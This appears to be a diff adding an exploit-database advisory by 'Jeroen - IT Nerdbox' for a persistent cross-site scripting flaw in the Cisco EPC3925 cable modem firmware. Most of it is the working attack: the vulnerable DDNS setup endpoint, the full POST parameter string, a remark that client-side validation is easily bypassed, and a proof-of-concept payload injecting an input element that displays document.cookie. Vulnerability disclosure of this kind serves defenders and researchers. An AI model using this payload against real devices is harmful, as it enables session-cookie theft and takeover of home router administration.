@@ -1,0 +1,55 @@
+#######################################################################
+
+# Exploit Title: Cisco EPC3925 - Persistent Cross Site Scripting 
+
+# Google Dork: N/A 
+
+# Date: 12-11-2013 
+
+# Exploit Author: Jeroen - IT Nerdbox 
+
+# Vendor Homepage: http://www.cisco.com 
+
+# Software Link: Not public 
+
+# Version: epc3925-E10-5-v302r125572-130520c 
+
+# Tested on: Cisco EPC3925 
+
+# CVE: N/A
+
+#######################################################################
+
+# Description
+
+# The parameter DdnsHostName is vulnerable to Persistent Cross Site Scripting. 
+
+# However, there is client side input validation, which can easily be bypassed.
+
+#
+
+# Location:
+
+#
+
+# POST http://[target]/goform/Setup_DDNS 
+
+# 
+
+# Parameters:
+
+#
+
+#DdnsService=0&DdnsUserName=xxx&DdnsPassword=****&DdnsHostName=<Enter Payload Here>&save=Save+Settings 
+
+# 
+
+# Payload 
+
+# 
+
+# PoC: "><input onmouseover=prompt(document.cookie)>
+
+#
+
+# Check out the video at: http://www.nerdbox.it/cisco-epc3925-persistent-xss/
